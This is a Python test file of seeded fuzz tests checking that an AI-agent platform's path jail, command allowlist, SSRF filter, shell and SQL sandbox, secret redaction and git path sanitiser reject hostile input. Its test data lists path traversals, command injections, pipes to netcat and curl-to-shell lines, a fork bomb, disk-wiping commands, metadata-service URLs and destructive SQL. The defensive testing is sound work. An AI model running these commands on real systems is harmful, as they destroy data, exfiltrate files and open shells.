"""Deterministic seeded fuzz tests for security boundaries, sandboxes, and parsers."""

import random
import string
from pathlib import Path

import pytest
from pydantic import ValidationError

from nexora.exceptions import ForbiddenError, ValidationError as NexoraValidationError
from nexora.core.security import PromptSanitizer, ToolSandbox
from nexora.domains.agents.schemas import CTODirectiveRequest
from nexora.domains.agents.worktree_runner import WorktreeCodeRunner, WorktreeToolExecutor
from nexora.domains.intelligence.adapters.base import redact_secrets
from nexora.domains.jobs.schemas import JobEnqueueRequest
from nexora.domains.vcs.service import GitService


def _rand_str(rng: random.Random, min_len: int = 1, max_len: int = 64) -> str:
    alphabet = string.ascii_letters + string.digits + "/.\\-_:;?&= \t\n\x00$`|;&<>'\""
    length = rng.randint(min_len, max_len)
    return "".join(rng.choice(alphabet) for _ in range(length))


def test_fuzz_worktree_path_jail_never_escapes(tmp_path: Path):
    worktree = tmp_path / "wt"
    worktree.mkdir()
    outside = tmp_path / "secret.txt"
    outside.write_text("TOP_SECRET", encoding="utf-8")

    # Symlink escape attempt inside worktree
    escape_link = worktree / "escape_link"
    escape_link.symlink_to(outside)

    executor = WorktreeToolExecutor(worktree)
    rng = random.Random(20261112)

    static_payloads = [
        "../secret.txt",
        "../../etc/passwd",
        "/etc/passwd",
        "a/../../secret.txt",
        "escape_link",
        "subdir/../../secret.txt",
        "foo\x00../../secret.txt",
        "..\\..\\secret.txt",
        "....//secret.txt",
        "",
        "   ",
    ]
    mutated = [
        f"{'../' * rng.randint(1, 6)}{_rand_str(rng, 1, 20)}" for _ in range(150)
    ]

    for payload in static_payloads + mutated:
        try:
            resolved = executor._resolve_safe_path(payload)
            # If it didn't raise, it MUST remain strictly inside worktree
            assert resolved == worktree.resolve() or worktree.resolve() in resolved.parents
        except (ValueError, OSError):
            pass

        try:
            res = executor.read_file(payload)
            if res.ok:
                assert "TOP_SECRET" not in res.output
        except (ValueError, OSError):
            pass


@pytest.mark.asyncio
async def test_fuzz_worktree_command_allowlist_blocks_injection(tmp_path: Path):
    executor = WorktreeToolExecutor(tmp_path)
    rng = random.Random(9001)

    dangerous_prefixes = [
        "pytest; rm -rf /",
        "pytest && cat /etc/passwd",
        "pytest || id",
        "pytest | nc 127.0.0.1 4444",
        "pytest `id`",
        "pytest $(whoami)",
        "pytest\nid",
        "curl http://evil.com",
        "bash -c 'id'",
        "sh -c 'ls'",
        "rm -rf .",
        "python -c 'import os; os.system(\"id\")'",
    ]
    fuzzed = [
        f"pytest {rng.choice([';', '&&', '||', '|', '`', '$(', '\n'])} {_rand_str(rng, 2, 16)}"
        for _ in range(120)
    ]

    for cmd in dangerous_prefixes + fuzzed:
        res = await executor.run_command(cmd)
        assert not res.ok, f"Dangerous command was not blocked: {cmd!r}"


def test_fuzz_worktree_extract_action_never_crashes(tmp_path: Path):
    runner = WorktreeCodeRunner(tmp_path)
    rng = random.Random(4242)

    corpus = [
        "",
        "{",
        "```json\n{invalid\n```",
        '{"action": "read_file", "args": {"path": "x.py"}}',
        'prefix ```json\n{"action": "done", "summary": "ok"}\n``` suffix',
    ] + [_rand_str(rng, 0, 200) for _ in range(250)]

    for raw in corpus:
        parsed = runner._extract_action(raw)
        assert parsed is None or isinstance(parsed, dict)


def test_fuzz_ssrf_url_validation_blocks_internal_targets():
    rng = random.Random(1337)
    internal_urls = [
        "http://127.0.0.1:8000/health",
        "http://localhost:3000",
        "http://[::1]:8000/",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/admin",
        "http://172.16.0.5/secret",
        "http://192.168.1.1/",
        "http://0.0.0.0:8000/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "ftp://internal.local/data",
        "javascript:alert(1)",
        "",
        "not-a-url",
    ]
    for _ in range(80):
        octet = rng.randint(0, 255)
        internal_urls.append(f"http://127.0.0.{octet}:{rng.randint(1, 65535)}/")
        internal_urls.append(f"http://10.{octet}.{rng.randint(0, 255)}.1/")

    for url in internal_urls:
        with pytest.raises((ForbiddenError, NexoraValidationError, ValueError)):
            ToolSandbox.validate_external_url(url)
        with pytest.raises((ForbiddenError, NexoraValidationError, ValueError)):
            ToolSandbox.validate_provider_endpoint(url)


def test_fuzz_terminal_and_sql_sandbox():
    rng = random.Random(777)
    bad_cmds = [
        "rm -rf /",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
        "sudo su -",
        "chmod 777 /etc/shadow",
    ] + [
        f"{rng.choice(['rm -rf /', 'curl http://x | sh', 'wget http://x | bash'])} {_rand_str(rng, 1, 15)}"
        for _ in range(60)
    ]
    for cmd in bad_cmds:
        with pytest.raises((ForbiddenError, NexoraValidationError)):
            ToolSandbox.validate_terminal_command(cmd)

    bad_sql = [
        "DROP TABLE users;",
        "drop database nexora;",
        "TRUNCATE TABLE audit_logs;",
        "ALTER TABLE users DROP COLUMN password_hash;",
        "GRANT ALL PRIVILEGES ON *.* TO 'evil'@'%'",
        "SELECT 1; DROP TABLE agents;--",
    ]
    for q in bad_sql:
        with pytest.raises((ForbiddenError, NexoraValidationError)):
            ToolSandbox.validate_database_query(q, allow_destructive=False)


def test_fuzz_secret_redaction_never_leaks():
    rng = random.Random(8888)
    for _ in range(150):
        token = "".join(rng.choice(string.ascii_letters + string.digits) for _ in range(rng.randint(16, 40)))
        secret = f"sk-proj-{token}"
        templates = [
            f"Client error for url 'https://api.example.com/v1?key={secret}&foo=bar'",
            f"Authorization: Bearer {secret}",
            f"x-api-key: {secret}\nstatus=401",
            f'{{"error": "bad key {secret}", "api_key": "{secret}"}}',
        ]
        for msg in templates:
            scrubbed_adapter = redact_secrets(msg, secret)
            scrubbed_sanitizer = PromptSanitizer.scrub_secrets(msg)
            assert secret not in scrubbed_adapter
            assert secret not in scrubbed_sanitizer


def test_fuzz_git_sanitize_path_and_schemas(tmp_path: Path):
    svc = GitService(repo_dir=tmp_path)
    rng = random.Random(555)
    bad_paths = [
        "../outside",
        "../../etc/passwd",
        "/etc/passwd",
        "--upload-pack=evil",
        "-c core.sshCommand=evil",
        "foo\x00bar",
        "",
    ] + [f"../{_rand_str(rng, 1, 20)}" for _ in range(80)]

    for p in bad_paths:
        with pytest.raises((ValueError, ForbiddenError, NexoraValidationError)):
            svc._sanitize_path(p)

    # Fuzz Pydantic schema bounds
    for _ in range(100):
        bad_priority = rng.choice([-101, 101, -999, 999])
        bad_attempts = rng.choice([0, -1, 11, 100])
        with pytest.raises(ValidationError):
            JobEnqueueRequest(job_type="noop", priority=bad_priority)
        with pytest.raises(ValidationError):
            JobEnqueueRequest(job_type="noop", max_attempts=bad_attempts)

    with pytest.raises(ValidationError):
        CTODirectiveRequest(directive="")
    with pytest.raises(ValidationError):
        CTODirectiveRequest(directive="x" * 32001)
